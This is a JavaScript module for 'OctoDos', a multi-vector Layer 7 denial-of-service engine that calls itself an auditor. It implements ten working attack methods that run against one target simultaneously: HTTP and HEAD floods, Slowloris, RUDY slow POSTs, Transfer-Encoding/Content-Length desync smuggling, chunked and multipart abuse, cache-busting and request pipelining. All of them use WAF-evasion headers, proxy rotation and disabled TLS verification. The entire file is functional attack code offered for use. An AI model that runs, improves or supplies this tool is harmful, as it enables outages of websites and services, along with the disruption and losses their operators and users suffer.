/**
 * OctoDos L7 Engine v1.0.0 — Multi-Vector Application Layer Auditor
 * 
 * 10 Coordinated Tentacle Methods:
 *   - HTTP-FLOOD:   High-speed randomized GET/POST/HEAD requests
 *   - SLOWLORIS:    Keep connections alive with partial headers
 *   - RUDY:         Slow POST body transmission (R-U-Dead-Yet)
 *   - HTTP-DESYNC:  Transfer-Encoding / Content-Length confusion
 *   - CHUNKED:      Chunked Transfer-Encoding abuse
 *   - BROWSER-EMU:  Full browser-like header fingerprinting
 *   - CACHE-BUST:   Cache-busting randomized query strings
 *   - MULTIPART:    Multipart form-data boundary abuse
 *   - HEAD-FLOOD:   HEAD-only requests (lightweight but server-processing)
 *   - PIPELINE:     HTTP pipelining abuse (multiple requests per connection)
 *
 * Created by ZetaGo-Aurum | MIT License
 */
const http = require('http');
const https = require('https');
const axios = require('axios');
const chalk = require('chalk');
const crypto = require('crypto');
const { generateEvasionHeaders, getRandomMethod, obfuscatePath, generatePostBody, randomHex, randInt, randomIp } = require('./antiwaf');
const { getNextProxy } = require('./proxy');

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: Infinity, maxFreeSockets: 256 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: Infinity, maxFreeSockets: 256, rejectUnauthorized: false });

// ══════════════════════════════════════════
// METHOD 1: HTTP-FLOOD
// ══════════════════════════════════════════
async function httpFlood(target, endTime, threadId, stats) {
    while (Date.now() < endTime) {
        const method = getRandomMethod();
        const url = obfuscatePath(target);
        const headers = generateEvasionHeaders(target);
        const proxy = getNextProxy();
        const config = {
            method: method.toLowerCase(), url, timeout: 4000, headers,
            httpAgent, httpsAgent, validateStatus: () => true, maxRedirects: 3,
        };
        if (proxy) { try { const p = proxy.replace('http://', ''); config.proxy = { host: p.split(':')[0], port: parseInt(p.split(':')[1]) }; } catch {} }
        if (['POST', 'PUT', 'PATCH'].includes(method)) {
            const { contentType, body } = generatePostBody();
            config.data = body; config.headers['Content-Type'] = contentType;
        }
        try {
            const resp = await axios(config);
            stats.success++; stats.codes[resp.status] = (stats.codes[resp.status] || 0) + 1;
        } catch (err) {
            stats.failed++;
            if (err.response) stats.codes[err.response.status] = (stats.codes[err.response.status] || 0) + 1;
        }
        stats.total++;
    }
}

// ══════════════════════════════════════════
// METHOD 2: SLOWLORIS
// ══════════════════════════════════════════
async function slowloris(target, endTime, threadId, stats) {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const port = url.port || (isHttps ? 443 : 80);
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const mod = isHttps ? https : http;
            const req = mod.request({
                hostname: url.hostname, port, path: `/${randomHex(8)}`, method: 'GET',
                headers: { 'User-Agent': generateEvasionHeaders(target)['User-Agent'], 'Accept': '*/*', 'X-a': randomHex(randInt(1, 5000)) },
                timeout: 0, agent: false, rejectUnauthorized: false,
            });
            req.on('error', () => { stats.failed++; resolve(); });
            req.on('timeout', () => { req.destroy(); resolve(); });
            const sendPartial = () => {
                if (Date.now() >= endTime) { req.destroy(); resolve(); return; }
                try { req.setHeader(`X-${randomHex(4)}`, randomHex(randInt(1, 100))); } catch {}
                stats.total++; stats.success++;
                setTimeout(sendPartial, randInt(5000, 15000));
            };
            req.flushHeaders(); stats.total++;
            setTimeout(sendPartial, randInt(1000, 5000));
        });
    }
}

// ══════════════════════════════════════════
// METHOD 3: RUDY (R-U-Dead-Yet)
// ══════════════════════════════════════════
async function rudy(target, endTime, threadId, stats) {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const port = url.port || (isHttps ? 443 : 80);
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const bodySize = randInt(10000, 100000);
            const mod = isHttps ? https : http;
            const req = mod.request({
                hostname: url.hostname, port, path: url.pathname || '/', method: 'POST',
                headers: { ...generateEvasionHeaders(target), 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': bodySize },
                timeout: 0, agent: false, rejectUnauthorized: false,
            });
            req.on('error', () => { stats.failed++; resolve(); });
            req.on('response', () => { stats.success++; });
            let sent = 0;
            const sendByte = () => {
                if (Date.now() >= endTime || sent >= bodySize) { try { req.end(); } catch {} resolve(); return; }
                try { const chunk = randomHex(randInt(1, 10)); req.write(chunk); sent += chunk.length; } catch { resolve(); return; }
                stats.total++;
                setTimeout(sendByte, randInt(500, 3000));
            };
            stats.total++; sendByte();
        });
    }
}

// ══════════════════════════════════════════
// METHOD 4: HTTP-DESYNC
// ══════════════════════════════════════════
async function httpDesync(target, endTime, threadId, stats) {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const port = url.port || (isHttps ? 443 : 80);
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const mod = isHttps ? https : http;
            const smuggleBody = `0\r\n\r\nGET /${randomHex(8)} HTTP/1.1\r\nHost: ${url.hostname}\r\nContent-Length: 10\r\n\r\n${randomHex(10)}`;
            const req = mod.request({
                hostname: url.hostname, port, path: url.pathname || '/', method: 'POST',
                headers: { ...generateEvasionHeaders(target), 'Content-Length': smuggleBody.length + randInt(1, 50), 'Transfer-Encoding': 'chunked' },
                timeout: 3000, agent: false, rejectUnauthorized: false,
            });
            req.on('error', () => { stats.failed++; resolve(); });
            req.on('response', (res) => { stats.success++; stats.codes[res.statusCode] = (stats.codes[res.statusCode] || 0) + 1; res.resume(); resolve(); });
            req.on('timeout', () => { req.destroy(); resolve(); });
            try { req.write(smuggleBody); req.end(); } catch { resolve(); }
            stats.total++;
        });
    }
}

// ══════════════════════════════════════════
// METHOD 5: CHUNKED
// ══════════════════════════════════════════
async function chunkedAbuse(target, endTime, threadId, stats) {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const port = url.port || (isHttps ? 443 : 80);
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const mod = isHttps ? https : http;
            const req = mod.request({
                hostname: url.hostname, port, path: url.pathname || '/', method: 'POST',
                headers: { ...generateEvasionHeaders(target), 'Transfer-Encoding': 'chunked', 'Content-Type': 'application/octet-stream' },
                timeout: 0, agent: false, rejectUnauthorized: false,
            });
            req.on('error', () => { stats.failed++; resolve(); });
            let chunks = 0; const maxChunks = randInt(50, 200);
            const sendChunk = () => {
                if (Date.now() >= endTime || chunks >= maxChunks) { try { req.write('0\r\n\r\n'); req.end(); } catch {} resolve(); return; }
                const data = randomHex(randInt(1, 64));
                try { req.write(`${data.length.toString(16)}\r\n${data}\r\n`); } catch { resolve(); return; }
                chunks++; stats.total++;
                setTimeout(sendChunk, randInt(200, 2000));
            };
            stats.total++; stats.success++; sendChunk();
        });
    }
}

// ══════════════════════════════════════════
// METHOD 6: BROWSER-EMU
// ══════════════════════════════════════════
async function browserEmu(target, endTime, threadId, stats) {
    while (Date.now() < endTime) {
        const url = obfuscatePath(target);
        const headers = generateEvasionHeaders(target);
        // Extra browser-like headers
        headers['Sec-Ch-Ua'] = '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"';
        headers['Sec-Ch-Ua-Mobile'] = '?0';
        headers['Sec-Ch-Ua-Platform'] = '"Windows"';
        headers['Sec-Fetch-Dest'] = 'document';
        headers['Sec-Fetch-Mode'] = 'navigate';
        headers['Sec-Fetch-Site'] = 'none';
        headers['Sec-Fetch-User'] = '?1';
        headers['Upgrade-Insecure-Requests'] = '1';
        headers['Priority'] = 'u=0, i';
        try {
            const resp = await axios({ method: 'get', url, timeout: 5000, headers, httpAgent, httpsAgent, validateStatus: () => true });
            stats.success++; stats.codes[resp.status] = (stats.codes[resp.status] || 0) + 1;
        } catch (err) {
            stats.failed++;
            if (err.response) stats.codes[err.response.status] = (stats.codes[err.response.status] || 0) + 1;
        }
        stats.total++;
    }
}

// ══════════════════════════════════════════
// METHOD 7: CACHE-BUST
// ══════════════════════════════════════════
async function cacheBust(target, endTime, threadId, stats) {
    while (Date.now() < endTime) {
        // Add random query params to bypass CDN/proxy caches
        const sep = target.includes('?') ? '&' : '?';
        const bustUrl = `${target}${sep}_cb=${Date.now()}_${randomHex(8)}&_r=${Math.random()}&_t=${crypto.randomUUID ? crypto.randomUUID() : randomHex(16)}`;
        const headers = generateEvasionHeaders(target);
        headers['Cache-Control'] = 'no-cache, no-store, must-revalidate, max-age=0';
        headers['Pragma'] = 'no-cache';
        headers['If-Modified-Since'] = 'Thu, 01 Jan 1970 00:00:00 GMT';
        headers['If-None-Match'] = `W/"${randomHex(16)}"`;
        try {
            const resp = await axios({ method: 'get', url: bustUrl, timeout: 4000, headers, httpAgent, httpsAgent, validateStatus: () => true });
            stats.success++; stats.codes[resp.status] = (stats.codes[resp.status] || 0) + 1;
        } catch (err) {
            stats.failed++;
            if (err.response) stats.codes[err.response.status] = (stats.codes[err.response.status] || 0) + 1;
        }
        stats.total++;
    }
}

// ══════════════════════════════════════════
// METHOD 8: MULTIPART-FLOOD
// ══════════════════════════════════════════
async function multipartFlood(target, endTime, threadId, stats) {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const port = url.port || (isHttps ? 443 : 80);
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const boundary = `----WebKitFormBoundary${randomHex(16)}`;
            const fields = randInt(5, 20);
            let body = '';
            for (let i = 0; i < fields; i++) {
                body += `--${boundary}\r\nContent-Disposition: form-data; name="${randomHex(8)}"\r\n\r\n${randomHex(randInt(100, 5000))}\r\n`;
            }
            // Add a fake file upload field
            body += `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${randomHex(8)}.bin"\r\nContent-Type: application/octet-stream\r\n\r\n${randomHex(randInt(1000, 10000))}\r\n`;
            body += `--${boundary}--\r\n`;

            const mod = isHttps ? https : http;
            const req = mod.request({
                hostname: url.hostname, port, path: url.pathname || '/', method: 'POST',
                headers: { ...generateEvasionHeaders(target), 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': Buffer.byteLength(body) },
                timeout: 5000, agent: false, rejectUnauthorized: false,
            });
            req.on('error', () => { stats.failed++; resolve(); });
            req.on('response', (res) => { stats.success++; stats.codes[res.statusCode] = (stats.codes[res.statusCode] || 0) + 1; res.resume(); resolve(); });
            req.on('timeout', () => { req.destroy(); resolve(); });
            try { req.write(body); req.end(); } catch { resolve(); }
            stats.total++;
        });
    }
}

// ══════════════════════════════════════════
// METHOD 9: HEAD-FLOOD
// ══════════════════════════════════════════
async function headFlood(target, endTime, threadId, stats) {
    while (Date.now() < endTime) {
        const url = obfuscatePath(target);
        const headers = generateEvasionHeaders(target);
        try {
            const resp = await axios({ method: 'head', url, timeout: 3000, headers, httpAgent, httpsAgent, validateStatus: () => true });
            stats.success++; stats.codes[resp.status] = (stats.codes[resp.status] || 0) + 1;
        } catch (err) {
            stats.failed++;
            if (err.response) stats.codes[err.response.status] = (stats.codes[err.response.status] || 0) + 1;
        }
        stats.total++;
    }
}

// ══════════════════════════════════════════
// METHOD 10: PIPELINE
// ══════════════════════════════════════════
async function pipeline(target, endTime, threadId, stats) {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const port = url.port || (isHttps ? 443 : 80);
    while (Date.now() < endTime) {
        await new Promise((resolve) => {
            const socket = require('net').connect(port, url.hostname, () => {
                // Send multiple HTTP requests without waiting for response (pipelining)
                const pipeCount = randInt(5, 20);
                for (let i = 0; i < pipeCount; i++) {
                    const path = `/${randomHex(8)}?pipe=${i}&cb=${Date.now()}`;
                    const req = `GET ${path} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: ${generateEvasionHeaders(target)['User-Agent']}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n`;
                    try { socket.write(req); stats.total++; stats.success++; } catch { break; }
                }
                setTimeout(() => { socket.destroy(); resolve(); }, randInt(500, 3000));
            });
            socket.on('error', () => { stats.failed++; resolve(); });
            socket.setTimeout(5000, () => { socket.destroy(); resolve(); });
        });
    }
}

// ══════════════════════════════════════════
// TENTACLE COORDINATOR
// ══════════════════════════════════════════
async function startL7(target, threads, time) {
    console.log(chalk.hex('#FF6B6B').bold('\n  ┌──────────────────────────────────────────────────┐'));
    console.log(chalk.hex('#FF6B6B').bold('  │   🐙 L7 OCTOPUS TENTACLE ENGINE — 10 Methods      │'));
    console.log(chalk.hex('#FF6B6B').bold('  └──────────────────────────────────────────────────┘'));
    console.log(chalk.cyan(`  Target:    ${target}`));
    console.log(chalk.cyan(`  Threads:   ${threads}`));
    console.log(chalk.cyan(`  Duration:  ${time}s`));

    const methods = [
        { name: 'HTTP-FLOOD',   fn: httpFlood,      weight: 25 },
        { name: 'SLOWLORIS',    fn: slowloris,      weight: 10 },
        { name: 'RUDY',         fn: rudy,           weight: 8 },
        { name: 'HTTP-DESYNC',  fn: httpDesync,     weight: 10 },
        { name: 'CHUNKED',      fn: chunkedAbuse,   weight: 7 },
        { name: 'BROWSER-EMU',  fn: browserEmu,     weight: 10 },
        { name: 'CACHE-BUST',   fn: cacheBust,      weight: 10 },
        { name: 'MULTIPART',    fn: multipartFlood,  weight: 8 },
        { name: 'HEAD-FLOOD',   fn: headFlood,      weight: 7 },
        { name: 'PIPELINE',     fn: pipeline,       weight: 5 },
    ];

    const totalWeight = methods.reduce((a, m) => a + m.weight, 0);
    console.log(chalk.yellow('\n  🐙 Tentacle Distribution (coordinated multi-vector):'));
    const methodNames = [];
    methods.forEach(m => {
        const t = Math.max(1, Math.round((m.weight / totalWeight) * threads));
        console.log(chalk.gray(`    ▸ ${m.name.padEnd(14)} ${String(t).padStart(3)} threads (${m.weight}%)`));
        methodNames.push(m.name);
    });
    console.log(chalk.gray(`\n    All 10 tentacles attack simultaneously, creating`));
    console.log(chalk.gray(`    a coordinated storm on a single target point.\n`));

    const endTime = Date.now() + (time * 1000);
    const startTime = Date.now();
    const stats = { total: 0, success: 0, failed: 0, codes: {} };

    const statsInterval = setInterval(() => {
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        const rps = (stats.total / (elapsed || 1)).toFixed(0);
        process.stdout.write(chalk.gray(`\r  [🐙] Sent: ${stats.total} | OK: ${stats.success} | Fail: ${stats.failed} | RPS: ${rps} | ${elapsed}s   `));
    }, 400);

    const threadPool = [];
    let threadIdx = 0;
    for (const method of methods) {
        const count = Math.max(1, Math.round((method.weight / totalWeight) * threads));
        for (let i = 0; i < count; i++) {
            threadPool.push(method.fn(target, endTime, threadIdx++, stats));
        }
    }

    await Promise.all(threadPool);
    clearInterval(statsInterval);
    process.stdout.write('\n');

    const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
    const rps = (stats.total / elapsed).toFixed(0);

    console.log(chalk.hex('#FF6B6B').bold('\n  ┌──────────────────────────────────────────────────┐'));
    console.log(chalk.hex('#FF6B6B').bold('  │   📊 L7 AUDIT RESULTS                             │'));
    console.log(chalk.hex('#FF6B6B').bold('  └──────────────────────────────────────────────────┘'));
    console.log(chalk.white(`  Total Requests:     ${stats.total}`));
    console.log(chalk.white(`  Successful:         ${stats.success}`));
    console.log(chalk.white(`  Failed:             ${stats.failed}`));
    console.log(chalk.white(`  Avg RPS:            ${rps}`));
    console.log(chalk.white(`  Duration:           ${elapsed}s`));
    console.log(chalk.white(`  Tentacles Used:     ${methods.length} (${methodNames.join(', ')})`));

    if (Object.keys(stats.codes).length > 0) {
        console.log(chalk.white(`  Status Codes:`));
        Object.entries(stats.codes).sort().forEach(([code, count]) => {
            const color = code.startsWith('2') ? chalk.green : code.startsWith('3') ? chalk.blue :
                          code.startsWith('4') ? chalk.yellow : code.startsWith('5') ? chalk.red : chalk.white;
            console.log(color(`    ${code}: ${count}`));
        });
    }

    return { totalRequests: stats.total, successfulRequests: stats.success, failedRequests: stats.failed, statusCodes: stats.codes, rps: parseInt(rps), elapsed, methodsUsed: methodNames };
}

module.exports = { startL7 };
